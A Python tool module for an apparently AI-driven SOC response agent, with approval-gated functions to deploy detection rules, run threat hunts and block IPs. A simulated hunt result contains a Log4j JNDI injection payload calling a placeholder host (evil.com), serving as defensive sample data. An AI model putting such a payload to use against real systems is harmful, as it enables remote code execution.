"""
Tools for the Action Agent.
Handles executing response actions and generating action recommendations.

FIXED VERSION - Proper imports and PendingAction handling
"""
import json
from datetime import datetime
from typing import Dict, Any, List

# Use the correct imports based on your project structure
from database import SessionLocal, Incident, Action, PendingAction, DetectionRule, Hunt, HuntResult


def execute_action(action_id: int, executed_by: str = "analyst") -> Dict[str, Any]:
    """
    Execute a recommended action and mark it as completed.
    
    Args:
        action_id: The ID of the action to execute
        executed_by: Who is executing the action (default: analyst)
    
    Returns:
        Dictionary with execution result
    """
    db = SessionLocal()
    try:
        action = db.query(Action).filter(Action.id == action_id).first()
        
        if not action:
            return {"success": False, "error": f"Action {action_id} not found"}
        
        if action.executed:
            return {"success": False, "error": f"Action {action_id} already executed"}
        
        action.executed = True
        action.executed_at = datetime.utcnow()
        action.executed_by = executed_by
        action.result = json.dumps({
            "status": "executed",
            "message": f"Action '{action.title}' executed successfully",
            "timestamp": str(datetime.utcnow())
        })
        
        db.commit()
        
        return {
            "success": True,
            "action": {
                "id": action.id,
                "title": action.title,
                "executed": True,
                "executed_at": str(action.executed_at),
                "executed_by": action.executed_by
            }
        }
    except Exception as e:
        db.rollback()
        return {"success": False, "error": str(e)}
    finally:
        db.close()


def get_incident_actions(incident_id: int) -> Dict[str, Any]:
    """
    Get all actions associated with a specific incident.
    
    Args:
        incident_id: The ID of the incident
    
    Returns:
        Dictionary with list of actions
    """
    db = SessionLocal()
    try:
        incident = db.query(Incident).filter(Incident.id == incident_id).first()
        
        if not incident:
            return {"success": False, "error": f"Incident {incident_id} not found"}
        
        actions = db.query(Action).filter(Action.incident_id == incident_id).all()
        
        return {
            "success": True,
            "incident_id": incident_id,
            "incident_title": incident.title,
            "actions": [
                {
                    "id": a.id,
                    "title": a.title,
                    "description": a.description,
                    "action_type": a.action_type,
                    "urgency": a.urgency,
                    "executed": a.executed,
                    "executed_at": str(a.executed_at) if a.executed_at else None,
                    "executed_by": a.executed_by
                }
                for a in actions
            ]
        }
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        db.close()


def get_all_pending_actions() -> Dict[str, Any]:
    """
    Get all actions that haven't been executed yet.
    
    Returns:
        Dictionary with list of pending actions
    """
    db = SessionLocal()
    try:
        actions = db.query(Action).filter(Action.executed == False).all()
        
        return {
            "success": True,
            "pending_count": len(actions),
            "actions": [
                {
                    "id": a.id,
                    "incident_id": a.incident_id,
                    "title": a.title,
                    "urgency": a.urgency,
                    "action_type": a.action_type
                }
                for a in actions
            ]
        }
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        db.close()


def create_action(
    incident_id: int,
    title: str,
    description: str,
    urgency: str = "Soon",
    action_type: str = "AI Recommended"
) -> Dict[str, Any]:
    """
    Create a new action for an incident.
    
    Args:
        incident_id: The ID of the incident this action belongs to
        title: Brief action title
        description: Detailed description of what to do
        urgency: Priority level (Immediate, Soon, Monitor)
        action_type: Type of action (AI Recommended, Manual, Automated)
    
    Returns:
        Dictionary with created action details
    """
    db = SessionLocal()
    try:
        incident = db.query(Incident).filter(Incident.id == incident_id).first()
        
        if not incident:
            return {"success": False, "error": f"Incident {incident_id} not found"}
        
        action = Action(
            incident_id=incident_id,
            title=title,
            description=description,
            urgency=urgency,
            action_type=action_type
        )
        db.add(action)
        db.commit()
        
        return {
            "success": True,
            "action": {
                "id": action.id,
                "incident_id": incident_id,
                "title": title,
                "description": description,
                "urgency": urgency,
                "action_type": action_type,
                "executed": False
            }
        }
    except Exception as e:
        db.rollback()
        return {"success": False, "error": str(e)}
    finally:
        db.close()


# ========================= THREAT CENTER ACTIONS =========================

def deploy_detection_rule(rule_id: int) -> Dict[str, Any]:
    """
    Deploy an approved detection rule to SIEM.
    
    SAFEGUARD: Only deploys if rule.status == 'approved' AND approved_by is set.
    
    Args:
        rule_id: The ID of the detection rule to deploy
    
    Returns:
        Dictionary with deployment result
    """
    db = SessionLocal()
    try:
        rule = db.query(DetectionRule).filter(DetectionRule.id == rule_id).first()
        
        if not rule:
            return {"success": False, "error": f"Rule {rule_id} not found"}
        
        # ========== SAFEGUARD CHECKS ==========
        if rule.status != 'approved':
            return {
                "success": False,
                "error": f"Rule not approved. Current status: {rule.status}",
                "hint": "Rule must be approved via UI before deployment"
            }
        
        if not rule.approved_by:
            return {"success": False, "error": "No approver recorded - cannot deploy"}
        
        if not rule.approved_at:
            return {"success": False, "error": "No approval timestamp - cannot deploy"}
        # ========== END SAFEGUARDS ==========
        
        # Update status to deploying
        rule.status = 'deploying'
        db.commit()
        
        # In production, call Sentinel API here
        # For now, simulate successful deployment
        deployment_result = {
            "success": True,
            "message": f"Rule '{rule.title}' deployed to {rule.siem_platform}",
            "sentinel_rule_id": f"soc-ai-{rule.id}-{int(datetime.now().timestamp())}"
        }
        
        if deployment_result["success"]:
            rule.status = 'deployed'
            rule.deployed_at = datetime.utcnow()
            rule.sentinel_rule_id = deployment_result.get("sentinel_rule_id")
        else:
            rule.status = 'failed'
            rule.deployment_error = deployment_result.get("error", "Unknown error")
        
        db.commit()
        
        return {
            "success": True,
            "rule_id": rule_id,
            "status": rule.status,
            "sentinel_rule_id": rule.sentinel_rule_id,
            "message": deployment_result.get("message")
        }
        
    except Exception as e:
        db.rollback()
        return {"success": False, "error": str(e)}
    finally:
        db.close()


def execute_hunt(hunt_id: int) -> Dict[str, Any]:
    """
    Execute an approved threat hunt.
    
    SAFEGUARD: Only executes if hunt.status == 'approved' AND approved_by is set.
    
    Args:
        hunt_id: The ID of the hunt to execute
    
    Returns:
        Dictionary with execution result
    """
    db = SessionLocal()
    try:
        hunt = db.query(Hunt).filter(Hunt.id == hunt_id).first()
        
        if not hunt:
            return {"success": False, "error": f"Hunt {hunt_id} not found"}
        
        # ========== SAFEGUARD CHECKS ==========
        if hunt.status != 'approved':
            return {
                "success": False,
                "error": f"Hunt not approved. Current status: {hunt.status}",
                "hint": "Hunt must be approved via UI before execution"
            }
        
        if not hunt.approved_by:
            return {"success": False, "error": "No approver recorded - cannot execute"}
        
        if not hunt.approved_at:
            return {"success": False, "error": "No approval timestamp - cannot execute"}
        # ========== END SAFEGUARDS ==========
        
        # Update status
        hunt.status = 'executing'
        hunt.executed_at = datetime.utcnow()
        db.commit()
        
        # Simulate hunt execution (in production, run actual SIEM query)
        simulated_results = simulate_hunt_execution(hunt.hunt_query)
        
        # Save results
        hunt_result = HuntResult(
            hunt_id=hunt.id,
            findings_count=simulated_results['total_events'],
            findings_summary=simulated_results['summary'],
            malicious_ips=json.dumps(simulated_results.get('malicious_ips', [])),
            suspicious_domains=json.dumps(simulated_results.get('suspicious_domains', [])),
            affected_hosts=json.dumps(simulated_results.get('affected_hosts', [])),
            raw_results=json.dumps(simulated_results.get('raw', []))
        )
        db.add(hunt_result)
        
        hunt.status = 'completed'
        hunt.completed_at = datetime.utcnow()
        db.commit()
        
        return {
            "success": True,
            "hunt_id": hunt_id,
            "status": "completed",
            "findings_count": hunt_result.findings_count,
            "malicious_ips": simulated_results.get('malicious_ips', []),
            "affected_hosts": simulated_results.get('affected_hosts', [])
        }
        
    except Exception as e:
        db.rollback()
        return {"success": False, "error": str(e)}
    finally:
        db.close()


def simulate_hunt_execution(query: str) -> Dict[str, Any]:
    """
    Simulate hunt query execution.
    In production, replace with actual SIEM API call (Sentinel, Splunk, Elastic).
    
    Args:
        query: The hunt query to execute
    
    Returns:
        Simulated results
    """
    import random
    
    # Pattern-based simulation
    if 'jndi' in query.lower() or 'log4j' in query.lower():
        return {
            'total_events': random.randint(10, 50),
            'summary': 'Found JNDI injection attempts targeting web servers',
            'malicious_ips': ['185.220.101.34', '45.155.205.233', '194.26.29.102'],
            'affected_hosts': ['web-server-01', 'app-server-02'],
            'raw': [
                {'time': '2024-01-15T08:23:00', 'src': '185.220.101.34', 'payload': '${jndi:ldap://evil.com/a}'}
            ]
        }
    elif 'powershell' in query.lower() or 'encoded' in query.lower():
        return {
            'total_events': random.randint(5, 20),
            'summary': 'Detected encoded PowerShell commands',
            'malicious_ips': [],
            'affected_hosts': ['ws-042', 'srv-app-03'],
            'raw': []
        }
    else:
        return {
            'total_events': random.randint(0, 10),
            'summary': 'Hunt completed with minimal findings',
            'malicious_ips': [],
            'affected_hosts': [],
            'raw': []
        }


def block_ip_list(ips: List[str]) -> Dict[str, Any]:
    """
    Block a list of IPs at the firewall.
    In production, integrate with your firewall API.
    
    Args:
        ips: List of IP addresses to block
    
    Returns:
        Result of the blocking operation
    """
    # Simulate firewall API call
    return {
        "success": True,
        "message": f"Blocked {len(ips)} IPs at firewall",
        "blocked": ips,
        "firewall": "simulated"
    }


def execute_approved_action(action_id: int) -> Dict[str, Any]:
    """
    Execute a pending action ONLY if it has been approved.
    
    SAFEGUARD: Checks status == 'approved' AND approved_by is set.
    
    Args:
        action_id: The ID of the pending action to execute
    
    Returns:
        Dictionary with execution result
    """
    db = SessionLocal()
    try:
        action = db.query(PendingAction).filter(PendingAction.id == action_id).first()
        
        if not action:
            return {"success": False, "error": f"Action {action_id} not found", "executed": False}
        
        # ========== SAFEGUARD CHECKS ==========
        if action.status != 'approved':
            return {
                "success": False,
                "error": f"Action not approved. Current status: {action.status}",
                "executed": False
            }
        
        if not action.approved_by:
            return {"success": False, "error": "No approver recorded", "executed": False}
        # ========== END SAFEGUARDS ==========
        
        # Update status
        action.status = 'executing'
        db.commit()
        
        # Execute based on action type
        payload = json.loads(action.payload) if action.payload else {}
        
        if action.action_type == 'deploy_rule':
            result = deploy_detection_rule(payload.get('rule_id'))
        elif action.action_type == 'block_ips':
            result = block_ip_list(payload.get('ips', []))
        elif action.action_type == 'execute_hunt':
            result = execute_hunt(payload.get('hunt_id'))
        else:
            result = {"success": False, "error": f"Unknown action type: {action.action_type}"}
        
        # Update action status
        action.status = 'completed' if result.get('success') else 'failed'
        action.executed_at = datetime.utcnow()
        action.execution_result = json.dumps(result)
        db.commit()
        
        return {
            "success": result.get('success', False),
            "executed": True,
            "action_id": action.id,
            "action_type": action.action_type,
            "result": result
        }
        
    except Exception as e:
        db.rollback()
        return {"success": False, "error": str(e), "executed": False}
    finally:
        db.close()


# Export all functions
__all__ = [
    'execute_action',
    'get_incident_actions',
    'get_all_pending_actions',
    'create_action',
    'deploy_detection_rule',
    'execute_hunt',
    'block_ip_list',
    'execute_approved_action'
]
